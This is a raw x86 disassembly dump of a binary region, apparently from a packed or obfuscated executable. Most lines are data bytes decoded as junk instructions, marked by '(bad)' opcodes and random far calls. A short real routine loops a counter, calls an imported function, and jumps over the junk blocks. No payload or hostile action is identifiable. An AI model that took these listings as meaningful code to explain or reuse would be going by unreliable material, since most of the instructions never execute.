  411e43:	cmp    DWORD PTR [eax],esp
  411e45:	xchg   esi,eax
  411e46:	sti    
  411e47:	cmp    BYTE PTR [ebx-0x24d42671],dh
  411e4d:	pop    eax
  411e4e:	test   BYTE PTR [ebx],ch
  411e50:	ins    BYTE PTR es:[edi],dx
  411e51:	(bad)  
  411e52:	aam    0x20
  411e54:	call   0xba5b:0xca588576
  411e5b:	aad    0x26
  411e5d:	adc    al,0xf7
  411e5f:	inc    esp
  411e60:	ret    0xfbfe
  411e63:	add    bh,BYTE PTR [edi-0x1a1f59c2]
  411e69:	push   cs
  411e6a:	and    BYTE PTR ds:0x75321708,0x68
  411e71:	test   eax,0xe2a2bf18
  411e76:	mov    eax,ds:0xe534dea8
  411e7b:	cmp    BYTE PTR [ecx-0x59],ch
  411e7e:	jle    0x411e42
  411e80:	mov    ds:0x67014b83,al
  411e85:	fdivrp st(3),st
  411e87:	xor    DWORD PTR [edx+0x1a556e42],0xccd40796
  411e91:	or     al,0x3
  411e93:	mov    ecx,0x1a1c47b6
  411e98:	sbb    bl,BYTE PTR ds:0x822ef341
  411e9e:	ins    DWORD PTR es:[edi],dx
  411e9f:	stos   BYTE PTR es:[edi],al
  411ea0:	push   edx
  411ea1:	xor    DWORD PTR [esi+0x14d01994],edi
  411ea7:	enter  0x350e,0x1a
  411eab:	lods   al,BYTE PTR ds:[esi]
  411eac:	fs or  bl,dl
  411eaf:	mov    eax,ds:0xb18be927
  411eb4:	sub    cl,bl
  411eb6:	lds    edx,FWORD PTR [edx]
  411eb8:	xor    BYTE PTR [ecx],dh
  411eba:	inc    ebx
  411ebb:	xor    edx,DWORD PTR [edi+0xc]
  411ebe:	dec    esp
  411ebf:	call   0xb75c:0xe1050f80
  411ec6:	scas   al,BYTE PTR es:[edi]
  411ec7:	inc    esp
  411ec8:	cdq    
  411ec9:	clc    
  411eca:	in     eax,dx
  411ecb:	mov    dh,0x87
  411ecd:	repz sahf 
  411ecf:	leave  
  411ed0:	xchg   esi,eax
  411ed1:	das    
  411ed2:	aas    
  411ed3:	div    BYTE PTR [ebx]
  411ed5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ed6:	mov    WORD PTR [ebx-0x66],?
  411ed9:	data16 mov BYTE PTR [edx],0x75
  411edd:	mov    al,0xc9
  411edf:	bound  eax,QWORD PTR [esi-0x3530916b]
  411ee5:	pop    edi
  411ee6:	add    al,BYTE PTR ds:0xd1121eda
  411eec:	or     eax,0x3e649374
  411ef1:	sar    BYTE PTR [ebx-0x56d93f4f],1
  411ef7:	or     ecx,DWORD PTR [eax-0x19]
  411efa:	push   ebp
  411efb:	xchg   ebp,eax
  411efc:	sti    
  411efd:	xchg   DWORD PTR [ebx-0x10f50a55],esp
  411f03:	test   al,0x6
  411f05:	int3   
  411f06:	mov    esi,0xece2196f
  411f0b:	fcomip st,st(5)
  411f0d:	dec    esi
  411f0e:	and    DWORD PTR [eax-0x5c8c8477],ecx
  411f14:	into   
  411f15:	or     ch,BYTE PTR [ebx+0x1d]
  411f18:	sub    esi,0xb46e087b
  411f1e:	adc    eax,0x6b08eea
  411f23:	sub    eax,0x2c85520b
  411f28:	adc    al,BYTE PTR [eax+0x37]
  411f2b:	xchg   ecx,eax
  411f2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f2d:	and    al,cl
  411f2f:	fwait
  411f30:	mov    edi,0xf9fb2bcb
  411f35:	fs pop esp
  411f37:	adc    DWORD PTR [esi],esi
  411f39:	mov    ah,0x15
  411f3b:	stc    
  411f3c:	sbb    ebp,ecx
  411f3e:	mov    al,0x2c
  411f40:	test   eax,0x20699738
  411f45:	lods   eax,DWORD PTR ds:[esi]
  411f46:	out    dx,eax
  411f47:	call   0xaaa371e2
  411f4c:	sbb    BYTE PTR [edi+0x31],dl
  411f4f:	add    ah,BYTE PTR [ebp+0x46b7cfc6]
  411f55:	mov    ebx,0x7e46a5fc
  411f5a:	xchg   edi,eax
  411f5b:	mov    ?,ebx
  411f5d:	loopne 0x411fb5
  411f5f:	xor    DWORD PTR [ebp-0x7c4de382],ebp
  411f65:	test   eax,0x2d73656c
  411f6a:	inc    edi
  411f6b:	mov    cl,0x82
  411f6d:	aas    
  411f6e:	out    dx,al
  411f6f:	stos   DWORD PTR es:[edi],eax
  411f70:	dec    ebx
  411f71:	out    dx,eax
  411f72:	ss ret 0x6a3a
  411f76:	pop    esi
  411f77:	test   al,0xb9
  411f79:	sub    ch,BYTE PTR [eax+0x71]
  411f7c:	mov    eax,ds:0x96d092ca
  411f81:	addr16 sub al,0x8b
  411f84:	inc    ebx
  411f85:	int    0x2c
  411f87:	mov    eax,0xfcf52ada
  411f8c:	out    dx,al
  411f8d:	push   ebx
  411f8e:	jp     0x411f1b
  411f90:	adc    ebp,DWORD PTR [eax-0x4c]
  411f93:	sbb    bl,BYTE PTR [edx+0x76583871]
  411f99:	pop    ss
  411f9a:	retf   
  411f9b:	xlat   BYTE PTR ds:[ebx]
  411f9c:	pop    edx
  411f9d:	fisubr WORD PTR [edx+0x50]
  411fa0:	call   FWORD PTR [ecx+0x17]
  411fa3:	xchg   ebx,eax
  411fa4:	jmp    0x1a2ebdf1
  411fa9:	ror    BYTE PTR [ebp+ebx*1-0x13],cl
  411fad:	out    0x2d,al
  411faf:	add    eax,0x9625b1b4
  411fb4:	and    ah,bh
  411fb6:	aam    0x12
  411fb8:	jno    0x411fc8
  411fba:	inc    si
  411fbc:	fnstsw WORD PTR [edx+edi*1]
  411fbf:	test   al,0x23
  411fc1:	xchg   ecx,eax
  411fc2:	cmp    ebp,DWORD PTR [edx+ebp*2-0x29e42bac]
  411fc9:	add    cl,BYTE PTR [ebp-0x7c]
  411fcc:	add    al,0x8d
  411fce:	inc    eax
  411fcf:	push   ebp
  411fd0:	xlat   BYTE PTR ds:[ebx]
  411fd1:	clc    
  411fd2:	es sahf 
  411fd4:	ja     0x412038
  411fd6:	push   eax
  411fd7:	pop    esp
  411fd8:	stos   DWORD PTR es:[edi],eax
  411fd9:	and    BYTE PTR [ebx],bh
  411fdb:	iret   
  411fdc:	xchg   ecx,eax
  411fdd:	(bad)  
  411fde:	std    
  411fdf:	cmp    BYTE PTR [ebx-0x75],ch
  411fe2:	loopne 0x411f8b
  411fe4:	xchg   esi,eax
  411fe5:	sub    dh,BYTE PTR [ecx-0x4b]
  411fe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fe9:	mov    esi,0x2a3f0764
  411fee:	dec    ecx
  411fef:	popa   
  411ff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ff1:	mov    eax,DWORD PTR [ecx+eiz*1+0x59]
  411ff5:	pop    ecx
  411ff6:	mov    eax,0x8184cfd7
  411ffb:	push   0xffffff9f
  411ffd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ffe:	add    cl,ah
  412000:	jp     0x411ff4
  412002:	mov    dh,BYTE PTR [ebx+0x64]
  412005:	jbe    0x41202c
  412007:	ror    esp,1
  412009:	adc    BYTE PTR [edi-0x31caa558],dh
  41200f:	lods   eax,DWORD PTR ds:[esi]
  412010:	mov    dh,0x1b
  412012:	xchg   edi,eax
  412013:	and    esp,DWORD PTR [edi-0x58a61f65]
  412019:	outs   dx,BYTE PTR ds:[esi]
  41201a:	mov    eax,ds:0xa5d8d26
  41201f:	inc    ecx
  412020:	stos   BYTE PTR es:[edi],al
  412021:	and    ebp,edx
  412023:	imul   edi,DWORD PTR [edi-0x59],0x942454c8
  41202a:	shl    esi,0x38
  41202d:	(bad)  
  41202e:	mov    DWORD PTR [edi+0x4fc61018],ecx
  412034:	adc    BYTE PTR [edi-0x48],cl
  412037:	xchg   esp,eax
  412038:	sbb    DWORD PTR [edi-0x52717f56],edx
  41203e:	sub    al,0x2d
  412040:	imul   ebx,DWORD PTR [esi+0x4455d9d2],0xf70454ca
  41204a:	test   dh,dl
  41204c:	(bad)  
  41204d:	fisubr DWORD PTR [ebx]
  41204f:	adc    eax,0x5ac1067f
  412054:	sub    BYTE PTR [edi-0x4189da95],0xc7
  41205b:	jbe    0x4120d4
  41205d:	lods   al,BYTE PTR ds:[esi]
  41205e:	sub    DWORD PTR [esi+eax*2+0x63cb6d3],ecx
  412065:	js     0x412063
  412067:	xchg   esi,eax
  412068:	pop    edi
  412069:	fild   DWORD PTR [eax+0x65f0aa4d]
  41206f:	xchg   esi,eax
  412070:	adc    ch,al
  412072:	out    dx,al
  412073:	mov    ah,0xf5
  412075:	or     DWORD PTR [edi],esi
  412077:	add    BYTE PTR [ecx+0x12],dl
  41207a:	sahf   
  41207b:	xchg   DWORD PTR [ecx],ecx
  41207d:	jge    0x4120e1
  41207f:	adc    BYTE PTR ds:0x12005d79,bh
  412085:	jo     0x4120fa
  412087:	push   cs
  412088:	cmp    al,0x49
  41208a:	cmp    eax,0x9d0781c0
  41208f:	ins    BYTE PTR es:[edi],dx
  412090:	cwde   
  412091:	jo     0x4120e2
  412093:	push   es
  412094:	jae    0x412066
  412096:	and    BYTE PTR [edx],0x50
  412099:	loop   0x412094
  41209b:	pop    esi
  41209c:	test   al,0x36
  41209e:	xor    eax,0x2af8578b
  4120a3:	bound  ebx,QWORD PTR [ecx-0x64a5dab9]
  4120a9:	mov    eax,DWORD PTR [ebp+0x8]
  4120ac:	mov    eax,DWORD PTR [eax]
  4120ae:	mov    ecx,DWORD PTR ds:0x41b224
  4120b4:	add    DWORD PTR [eax],ecx
  4120b6:	pop    esi
  4120b7:	pop    ebp
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fdf6
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fd55
  4120d3:	adc    DWORD PTR ds:0x42e76f,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e76b,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e783,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e77b,0x19
  412102:	cmp    DWORD PTR ds:0x42e77b,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e77b,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fdfe
  412121:	push   0x0
  412123:	push   0x42e2ed
  412128:	call   DWORD PTR ds:0x42e503
  41212e:	mov    ebx,DWORD PTR ds:0x42e77b
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e77b,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e1a0,0x42fd81
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	sbb    al,0x1f
  41216f:	jbe    0x412162
  412171:	inc    esi
  412172:	pop    edi
  412173:	jo     0x4121e5
  412175:	mov    ecx,0x8570707e
  41217a:	dec    ebp
  41217b:	retf   0xd805
  41217e:	test   ah,al
  412180:	push   es
  412181:	test   BYTE PTR [ebx],dl
  412183:	add    al,0x11
  412185:	popa   
  412186:	das    
  412187:	xor    esp,DWORD PTR [ecx-0x2cf5d3bb]
  41218d:	pop    ebx
  41218e:	mov    dh,0xde
  412190:	mov    dh,BYTE PTR [ebx+0x26]
  412193:	fistp  WORD PTR [ebx+0x34554b33]
  412199:	inc    eax
  41219a:	sub    al,0x5
  41219c:	mov    eax,ds:0xf08ffb52
  4121a1:	loopne 0x4121cf
  4121a3:	jns    0x412217
  4121a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121a6:	repz and eax,0x81a7ab51
  4121ac:	push   ecx
  4121ad:	add    eax,0x70934443
  4121b2:	das    
  4121b3:	mov    WORD PTR [ebp+esi*4+0xdc748da],fs
  4121ba:	mov    eax,ds:0xd9712c74
  4121bf:	mov    al,ah
  4121c1:	les    edi,FWORD PTR [ecx-0x7e0fbfd9]
  4121c7:	add    eax,0x331cf711
  4121cc:	mov    al,ds:0xa87c6ba6
  4121d1:	push   edx
  4121d2:	xchg   ebx,ebp
  4121d4:	dec    edi
  4121d5:	pop    ebp
  4121d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121d7:	fimul  DWORD PTR [ebp+0x5f703c62]
  4121dd:	adc    DWORD PTR [eax-0x2d26a90e],edx
  4121e3:	test   al,0xd4
  4121e5:	mov    eax,ds:0x502ee692
  4121ea:	mov    ch,0x68
  4121ec:	dec    edx
  4121ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121ee:	lahf   
  4121ef:	push   eax
  4121f0:	and    bl,BYTE PTR [edx]
  4121f2:	dec    ebx
  4121f3:	xlat   BYTE PTR ds:[ebx]
  4121f4:	mov    dl,0xb
  4121f6:	cwde   
  4121f7:	icebp  
  4121f8:	inc    ebp
  4121f9:	xchg   edi,eax
  4121fa:	out    dx,al
  4121fb:	sbb    BYTE PTR [edx],bl
  4121fd:	and    al,0xa3
  4121ff:	mov    cl,0x7a
  412201:	fdiv   st,st(0)
  412203:	add    BYTE PTR [ebx-0x55617d4d],bl
  412209:	(bad)  
  41220a:	in     al,0xcd
  41220c:	ret    0x4a8f
  41220f:	fimul  WORD PTR [edx-0x2]
  412212:	ret    
  412213:	out    dx,al
  412214:	xchg   edi,eax
  412215:	jl     0x412225
  412217:	pop    ss
  412218:	dec    esi
  412219:	leave  
  41221a:	jle    0x412297
  41221c:	mov    ecx,0xeed0d718
  412221:	aad    0xe7
  412223:	jg     0x4121f8
  412225:	enter  0x3cfa,0xf1
  412229:	(bad)  
  41222b:	jmp    0x7615ec82
  412230:	xor    BYTE PTR [eax],ah
  412232:	pop    ebp
  412233:	iret   
  412234:	jg     0x412208
  412236:	jno    0x412287
  412238:	xchg   edi,eax
  412239:	push   ebx
  41223a:	xlat   BYTE PTR ds:[ebx]
  41223b:	inc    edi
  41223c:	mov    eax,0xcf33d736
  412241:	iret   
  412242:	repz inc ecx
  412244:	pop    ebx
  412245:	jle    0x4122b8
  412247:	or     al,BYTE PTR [eax+0x38bd22dc]
  41224d:	push   ebp
  41224e:	pop    esi
  41224f:	fidivr WORD PTR [ebp+0x5]
  412252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412253:	push   edx
  412254:	shl    al,1
  412256:	ins    DWORD PTR es:[edi],dx
  412257:	mov    ah,0x8c
  412259:	xor    al,0x1c
  41225b:	xchg   ah,dl
  41225d:	mov    ebx,0x57e43bbe
  412262:	adc    bl,BYTE PTR [ebp+0x6e]
  412265:	mov    edi,0x5471e369
  41226a:	mov    ebp,0x422bdf1f
  41226f:	and    eax,0x9f6ab224
  412274:	js     0x412296
  412276:	mov    ds:0x8bbbf3df,al
  41227b:	push   edx
  41227c:	outs   dx,BYTE PTR ds:[esi]
  41227d:	ret    
  41227e:	adc    al,0xb5
  412280:	lods   al,BYTE PTR ds:[esi]
  412281:	sbb    eax,0xca9cc388
  412286:	push   ds
  412287:	loopne 0x4122bb
  412289:	mov    esp,ebp
  41228b:	pop    ds
  41228c:	sub    DWORD PTR [edx-0x6],ebx
  41228f:	push   ds
  412290:	mov    dh,0x9f
  412292:	(bad)  [eax-0x60]
  412295:	xor    bh,BYTE PTR ds:0xabea2543
  41229b:	sub    BYTE PTR [edx],ah
  41229d:	add    edi,DWORD PTR [edx+0x63792f86]
  4122a3:	in     eax,dx
  4122a4:	push   ss
  4122a5:	sti    
  4122a6:	or     DWORD PTR [ebx],eax
  4122a8:	pushf  
  4122a9:	mov    esi,0xca782342
  4122ae:	test   BYTE PTR [ecx+0x3e],0x3a
  4122b2:	mov    ds:0x485ac680,al
  4122b7:	leave  
  4122b8:	(bad)  
  4122b9:	push   eax
  4122ba:	adc    eax,0x96a12c31
  4122bf:	or     ah,BYTE PTR [edi+0x1c4dee8d]
  4122c5:	mul    dl
  4122c7:	sbb    al,BYTE PTR [esi]
  4122c9:	enter  0x157f,0x42
  4122cd:	dec    ebx
  4122ce:	jb     0x412255
  4122d0:	xor    BYTE PTR ds:0x5ed8ae97,al
  4122d6:	shl    DWORD PTR [ecx+0x1b],0x1a
  4122da:	cld    
  4122db:	dec    esp
  4122dc:	retf   0xe03f
  4122df:	sub    BYTE PTR [edx-0x32],ch
  4122e2:	cdq    
  4122e3:	jmp    0x54145739
  4122e8:	inc    ebx
  4122e9:	ss shr dl,cl
  4122ec:	and    al,bh
  4122ee:	shl    ch,cl
  4122f0:	and    eax,0xaa13337
  4122f5:	ins    BYTE PTR es:[edi],dx
  4122f6:	xor    edx,DWORD PTR [ebx-0x52]
  4122f9:	jl     0x4122d1
  4122fb:	pop    ebp
  4122fc:	push   esp
  4122fd:	mov    bh,0x4d
  4122ff:	loop   0x4122cf
  412301:	and    al,0x69
  412303:	push   edx
  412304:	mov    eax,0xc5e4ddbd
  412309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41230a:	mov    edx,0x8f915686
  41230f:	cmp    edx,DWORD PTR [edx-0x34602f73]
  412315:	dec    edx
  412316:	aas    
  412317:	and    BYTE PTR [esi+0x7ae24f8a],ah
  41231d:	mov    dl,0xc7
  41231f:	test   BYTE PTR [edx+0x394ea557],0xc9
  412326:	xchg   esi,eax
  412327:	in     eax,0x65
  412329:	xor    al,0x9c
  41232b:	and    eax,0xa0b79cac
  412330:	push   eax
  412331:	out    dx,eax
  412332:	pop    esi
  412333:	(bad)
  412337:	jb     0x412322
  412339:	add    ebp,DWORD PTR [edx]
  41233b:	call   ebx
  41233d:	popa   
  41233e:	mov    dl,0x51
  412340:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412341:	sbb    al,0xa
  412343:	scas   eax,DWORD PTR es:[edi]
  412344:	ins    DWORD PTR es:[edi],dx
  412345:	es xchg ebp,eax
  412347:	icebp  
  412348:	dec    esp
  412349:	and    ah,cl
  41234b:	das    
  41234c:	sbb    BYTE PTR [eax],ah
  41234e:	lahf   
  41234f:	mov    BYTE PTR [eax+esi*1+0x7bd16fdf],al
  412356:	jnp    0x412373
  412358:	jge    0x4123b8
  41235a:	xor    ah,BYTE PTR [eax]
  41235c:	mov    esp,0x3a13886a
  412361:	imul   esi,ebp,0xffffffa8
  412364:	nop
  412365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412366:	push   ds
  412367:	adc    eax,0x7453c8bf
  41236c:	or     DWORD PTR ds:0xdf1f4741,ecx
  412372:	and    WORD PTR ds:0x542853e2,di
  412379:	xor    ah,BYTE PTR [ecx*4-0x4db5bd14]
  412380:	(bad)
  412383:	ins    BYTE PTR es:[edi],dx
  412384:	repz fwait
  412386:	inc    ecx
  412387:	stos   DWORD PTR es:[edi],eax
  412388:	lea    ebp,[edx+0x6]
  41238b:	jae    0x41231b
  41238d:	std    
  41238e:	daa    
  41238f:	aam    0x7e
  412391:	mov    WORD PTR [ecx-0x70],ss
  412394:	cmp    BYTE PTR [ebx-0x52df22a2],dl
  41239a:	push   ebx
  41239b:	out    0xf9,eax
  41239d:	out    0x65,eax
  41239f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123a0:	gs xor eax,0x1264e6ad
  4123a6:	xlat   BYTE PTR ds:[ebx]
  4123a7:	sbb    DWORD PTR [esi],0xffffff9c
  4123aa:	repnz and al,0x47
  4123ad:	jp     0x412418
  4123af:	sub    eax,0x4357b598
  4123b4:	iret   
  4123b5:	xor    eax,DWORD PTR [eax-0x4]
  4123b8:	retf   
  4123b9:	mov    bl,0xe5
  4123bb:	push   edi
  4123bc:	inc    edi
  4123bd:	sbb    BYTE PTR [edx],dh
  4123bf:	dec    ebx
  4123c0:	mov    al,0x6f
  4123c2:	imul   ecx,DWORD PTR [ebx-0x51],0x29
  4123c6:	jmp    0x4123eb
  4123c8:	ja     0x41239d
  4123ca:	mov    WORD PTR [edx],gs
  4123cc:	xor    al,0x44
  4123ce:	push   eax
  4123cf:	out    0xb5,eax
  4123d1:	popf   
  4123d2:	mov    al,ds:0x1b5c552e
  4123d7:	pop    esp
  4123d8:	mov    DWORD PTR [esi-0x42115ee5],eax
  4123de:	cmp    DWORD PTR [eax-0x6b],ecx
  4123e1:	aas    
  4123e2:	fld    DWORD PTR [esi]
  4123e4:	push   esi
  4123e5:	cmp    DWORD PTR [esi-0x7c],eax
  4123e8:	cmp    eax,0xfc90fefc
  4123ed:	cmp    BYTE PTR [ecx+0x21e26d8f],al
  4123f3:	outs   dx,BYTE PTR ds:[esi]
  4123f4:	add    al,0x23
  4123f6:	cmc    
  4123f7:	xor    cl,al
  4123f9:	pop    ebx
  4123fa:	test   al,0x39
  4123fc:	adc    bl,BYTE PTR [esi]
  4123fe:	or     dh,BYTE PTR [eax]
  412400:	xchg   ebp,eax
  412401:	aam    0xd3
  412403:	fs loope 0x412442
  412406:	and    eax,0xff00549b
  41240b:	pop    edx
  41240c:	jo     0x41243e
  41240e:	outs   dx,BYTE PTR ds:[esi]
  41240f:	leave  
  412410:	xor    dh,ah
  412412:	add    esp,0xffffffca
  412415:	gs dec ebp
  412417:	mov    ah,0xb
  412419:	mov    bl,0xcf
  41241b:	ret    0x48a5
  41241e:	test   DWORD PTR [ecx],0x82c665c8
  412424:	xchg   ebp,eax
  412425:	sbb    DWORD PTR fs:[ebx-0xcd9d0f3],esi
  41242c:	adc    eax,0xf1c1380c
  412432:	loopne 0x412433
  412434:	in     al,0xcd
  412436:	inc    esi
  412437:	test   al,0xc0
  412439:	les    edx,FWORD PTR ss:[edi-0x76619298]
  412440:	add    ecx,ebx
  412442:	sub    DWORD PTR ds:0x42fd79,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	xchg   ecx,eax
  41245e:	jno    0x41240e
  412460:	pop    esi
  412461:	(bad)  
  412462:	pop    esp
  412463:	jo     0x4124d5
  412465:	mov    ecx,0x4170707e
  41246a:	pop    ebp
  41246b:	sbb    al,0xab
  41246d:	add    al,0xdb
  41246f:	cdq    
  412470:	es into 
  412472:	mov    esp,0xf984c14d
  412477:	ret    0x721b
  41247a:	add    edx,DWORD PTR [edi]
  41247c:	lahf   
  41247d:	mov    dh,0xe7
  41247f:	dec    DWORD PTR ds:0x1d642
  412485:	sub    bh,BYTE PTR [edi-0x68ee88b3]
  41248b:	sbb    BYTE PTR [ebp-0xb81b784],bh
  412491:	or     BYTE PTR [ecx],0xbf
  412494:	mov    ah,0xc4
  412496:	fnsave [esi+0x535adf8e]
  41249c:	xchg   ebx,eax
  41249d:	fwait
  41249e:	cs clc 
  4124a0:	mov    bh,0xed
  4124a2:	or     DWORD PTR [esi+0x71a055c0],0xffffffdc
  4124a9:	mov    eax,0xd85f8151
  4124ae:	pushf  
  4124af:	xchg   edx,eax
  4124b0:	cmp    BYTE PTR [ecx+0x21],bh
  4124b3:	retf   
  4124b4:	add    ecx,DWORD PTR [ecx+eax*8-0x53de8d2a]
  4124bb:	pop    ds
  4124bc:	xchg   DWORD PTR [ecx],edi
  4124be:	stos   DWORD PTR es:[edi],eax
  4124bf:	xchg   edi,eax
  4124c0:	and    eax,0x86c1ac55
  4124c5:	add    DWORD PTR [ecx],eax
  4124c7:	xlat   BYTE PTR ds:[ebx]
  4124c8:	or     DWORD PTR [ecx],0x1aad7f9b
  4124ce:	aaa    
  4124cf:	cdq    
  4124d0:	mov    cl,BYTE PTR [eax+0x68]
  4124d3:	pop    ds
  4124d4:	and    DWORD PTR [edi],esi
  4124d6:	rcl    BYTE PTR [edx+0x54899aee],0x6b
  4124dd:	xor    DWORD PTR [ebx-0x5f],ecx
  4124e0:	xor    BYTE PTR [ecx],cl
  4124e2:	cmp    ch,BYTE PTR [esi+0x22]
  4124e5:	dec    ebx
  4124e6:	adc    BYTE PTR [edx],bh
  4124e8:	sub    al,0x61
  4124ea:	out    dx,al
  4124eb:	mov    bh,0x54
  4124ed:	or     BYTE PTR [edx-0x49],bh
  4124f0:	xchg   esp,eax
  4124f1:	inc    ebx
  4124f2:	outs   dx,DWORD PTR ds:[esi]
  4124f3:	fidivr DWORD PTR [edx-0x5f58948a]
  4124f9:	lea    edx,[esi-0x3b]
  4124fc:	add    al,BYTE PTR [edx]
  4124fe:	sbb    eax,0x4c8808cc
  412503:	sbb    BYTE PTR [ecx+eiz*2],dh
  412506:	mov    bl,0x54
  412508:	xchg   edx,eax
  412509:	mov    ch,0x61
  41250b:	jae    0x41253e
  41250d:	jnp    0x412573
  41250f:	adc    BYTE PTR [ecx+0x6b],cl
  412512:	push   ebp
  412513:	sub    edx,edx
  412515:	dec    edx
  412516:	lea    edi,[ebx]
  412518:	lds    edx,FWORD PTR [edi-0x1a]
  41251b:	cwde   
  41251c:	push   cs
  41251d:	inc    ebx
  41251e:	jae    0x4124c5
  412520:	sbb    ch,BYTE PTR [eax-0x36]
  412523:	sahf   
  412524:	icebp  
  412525:	and    BYTE PTR ds:0xf87b3e8b,al
  41252b:	pop    ds
  41252c:	dec    eax
  41252d:	sti    
  41252e:	jge    0x41255b
  412530:	ins    BYTE PTR es:[edi],dx
  412531:	mov    cl,0x62
  412533:	inc    esp
  412534:	arpl   WORD PTR [esp+eiz*4],sp
  412537:	mov    ?,ebx
  412539:	push   eax
  41253a:	xchg   DWORD PTR [edi-0x60],ebp
  41253d:	pop    ds
  41253e:	stc    
  41253f:	lds    ecx,FWORD PTR [edx]
  412541:	mov    ds:0xf0d8f384,al
  412546:	cli    
  412547:	cmp    ah,cl
  412549:	std    
  41254a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41254b:	cdq    
  41254c:	or     esi,DWORD PTR ds:0x8c49460a
  412552:	addr16 or edi,edi
  412555:	lahf   
  412556:	xor    al,0x51
  412558:	inc    ecx
  412559:	out    dx,al
  41255a:	test   al,0x98
  41255c:	sub    DWORD PTR fs:[esi],0x7dcec9de
  412563:	je     0x41251a
  412565:	sbb    ah,BYTE PTR [edi]
  412567:	je     0x412565
  412569:	imul   ebx,DWORD PTR [ecx+0x426c2a02],0xffffffb7
  412570:	stos   DWORD PTR es:[edi],eax
  412571:	out    dx,eax
  412572:	in     al,0xc9
  412574:	hlt    
  412575:	out    dx,al
  412576:	ret    0xe720
  412579:	inc    esp
  41257a:	stos   BYTE PTR es:[edi],al
  41257b:	arpl   WORD PTR [ecx+0x357cc035],bp
  412581:	push   cs
  412582:	xlat   BYTE PTR ds:[ebx]
  412583:	lock adc eax,0x7f104a34
  412589:	out    dx,al
  41258a:	add    DWORD PTR ds:0x98b88795,ecx
  412590:	and    eax,0xc953557d
  412595:	push   0x791cd86d
  41259a:	dec    edi
  41259b:	jecxz  0x4125b4
  41259d:	das    
  41259e:	add    DWORD PTR [eax-0xc],esi
  4125a1:	pop    es
  4125a2:	aad    0x8c
  4125a4:	mov    DWORD PTR [ecx],0xa78ddc24
  4125aa:	mov    ebx,0x4fb0e0a3
  4125af:	sbb    BYTE PTR [edi-0x32],dh
  4125b2:	pop    es
  4125b3:	mov    ecx,0xefbc3f29
  4125b8:	mov    dh,0x9
  4125ba:	dec    ebp
  4125bb:	in     al,0x3d
  4125bd:	xchg   edx,eax
  4125be:	push   ecx
  4125bf:	xlat   BYTE PTR ds:[ebx]
  4125c0:	push   edx
  4125c1:	ret    0xb5f8
  4125c4:	mov    esi,fs
  4125c6:	stc    
  4125c7:	add    eax,0x2ddfb99d
  4125cc:	cmp    DWORD PTR [eax+0x6b0c705e],ebp
  4125d2:	mov    ds:0x31c68791,al
  4125d7:	arpl   cx,bx
  4125d9:	out    dx,eax
  4125da:	cmp    esp,eax
  4125dc:	enter  0xf41b,0xc1
  4125e0:	inc    esi
  4125e1:	loopne 0x41258c
  4125e3:	test   esi,0xac1cbd35
  4125e9:	ins    DWORD PTR es:[edi],dx
  4125ea:	push   ds
  4125eb:	fwait
  4125ec:	(bad)  
  4125ed:	in     al,dx
  4125ee:	out    dx,al
  4125ef:	sbb    al,ch
  4125f1:	sahf   
  4125f2:	inc    eax
  4125f3:	dec    esp
  4125f4:	mov    ds:0x70f4c766,al
  4125f9:	adc    BYTE PTR [eax-0x45337c],0x64
  412600:	cld    
  412601:	adc    DWORD PTR [ebp+0x1d4d3a3b],esp
  412607:	or     BYTE PTR [edi-0xa10b926],bh
  41260d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41260e:	in     al,0x4b
  412610:	outs   dx,DWORD PTR ds:[esi]
  412611:	ret    0x463c
  412614:	adc    ebp,esi
  412616:	xchg   dx,ax
  412618:	and    BYTE PTR [edi],cl
  41261a:	mov    ebx,0x71280bea
  41261f:	jae    0x4125c5
  412621:	not    DWORD PTR [esi-0x72]
  412624:	daa    
  412625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412626:	mov    bh,0x35
  412628:	mov    ah,0xe2
  41262a:	mov    ds:0xc79dc1f9,al
  41262f:	sbb    BYTE PTR [eax-0x47],al
  412632:	jns    0x412692
  412634:	xor    dh,BYTE PTR [edx]
  412636:	shl    DWORD PTR [eax-0x53],cl
  412639:	call   0xf135:0x26f08256
  412640:	and    al,0x32
  412642:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412643:	push   esp
  412644:	loop   0x412621
  412646:	push   edi
